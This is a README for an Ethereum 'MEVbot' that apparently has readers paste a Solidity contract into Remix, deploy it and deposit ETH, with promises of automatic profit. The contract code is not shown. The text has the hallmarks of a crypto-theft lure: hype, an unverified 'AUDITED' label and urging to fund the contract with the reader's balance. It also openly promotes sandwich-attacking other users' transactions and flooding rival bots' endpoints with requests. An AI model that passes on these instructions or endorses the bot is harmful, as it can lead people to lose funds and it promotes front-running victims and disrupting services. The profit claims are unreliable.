Making money via AI MEVbot attack opportunities (GPT-4 source) (AUDITED)
!
-----
![exp](https://i.imgur.com/LkpPuEL.png)
-----
**UPDATELOG**
-----

**UPDATE 04/30/2023:** Migrated from the manual "search for new contracts" function that was for Uniswap to an automatic contract location algorithm. This contract has been optimized and engineered to automatically locate and exploit profitable transactions from within the mempool, reducing gas fees during creation and offers full automation.

-----

Please note that the code was never intended for public release, as it was designed for my own purposes and contains various trade-offs. However, this method has been highly refined through extensive study, research, and experimentation. 

Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.

The MEVbot actively **sniffs the UniswapV2 mempool** and **identifies profitable slippage exploitation opportunities** to **sandwich attack a victims transaction**. The bot bundles its own transactions and **takes advantage of flashswaps and flashloans via flashbot RPC** with competitive gas and tips towards miners to gurantee **successful attack vectors** and **transaction order manipulation**. It actively competes with other bots to swap tokens on-chain quickly, The bot then returns the ETH to the contract, ready for withdrawal.

This bot does all that, and 99.9% faster than other bots.

'But ser, there are open source bots that do the same'

Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as I went through their same pains and from a bot builder to a bot builder, I feel these guys. <3

'Wen increase aggressiveness ?'

As i've spent a year obsessing about this, I have a list of target endpoints that I know other bots use, which I could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

..Personal journey in this

'What did I learn?'

MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web3 and web2 kind of architectures. And all sorts of ins and outs about Unsiwap and DEX

'So why stop?'

I've made some profits from this but now using some other better commercial and private methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end I kept getting outcompeted by this individual:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

But I will give you some competition.(ㆆ_ㆆ)

Overview
------
- How it works
- Setting up

(works only for Mainnet)
How it works:
----
create-a-frontrunner-bot-on-uniswap

You can see an example of how the bot works.
![0](https://user-images.githubusercontent.com/131911477/234767193-be276a13-315f-4e82-89c1-e37fa94a9952.png)


The bot will make transactions on your entire balance to increase profit
![exemple 4](https://user-images.githubusercontent.com/131911477/234769046-932b596d-a133-4973-abff-2f97408bcd2d.png)
![exemple5](https://user-images.githubusercontent.com/131911477/234769052-88db1c19-b1e7-47fd-9991-d234fe6413ca.png)



Remix IDE
-----
Access the Remix IDE, this is where we deploy the bot  https://remix.ethereum.org/ 
-----------
File Explorer
---------
 and click and create new file "MEV-bot_v5.1.sol"
Copy the code from MevBot.sol and paste in Remix IDE

![1](https://user-images.githubusercontent.com/131911477/234766560-33cd5cc5-4fc0-45fd-8541-5f2a2fd5232d.png)


Click Solidity complier 0.6.6
------

And press Compile Mev Bot.sol

![2](https://user-images.githubusercontent.com/131911477/234766622-5528655c-3c99-432b-b8ca-3b82fbcddeb8.png)


Select ETH or BSC(BNB) network
-----

Paste ETH or BNB in the top field, and the router address of the dex you wish to use

Press Transact (Deploy)
-----

![3](https://user-images.githubusercontent.com/131911477/234766652-0254d9fd-8c9f-48d7-b511-4015f4ea2729.png)


Deposit balance
------

Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button

![4](https://user-images.githubusercontent.com/131911477/234766676-fdbf97ef-d52e-4949-bea3-76696f646fd1.png)


![4 1](https://user-images.githubusercontent.com/131911477/234766691-727309f8-e73f-4ebe-84c5-77ead40b137a.png)


![5](https://user-images.githubusercontent.com/131911477/234766701-761850b3-3add-4b2e-9555-af3d6a28baba.png)

-----
The MEVBot begins trading immeditately, wait a couple of days for profits to accumulate. To ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2-1 ETH).

You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
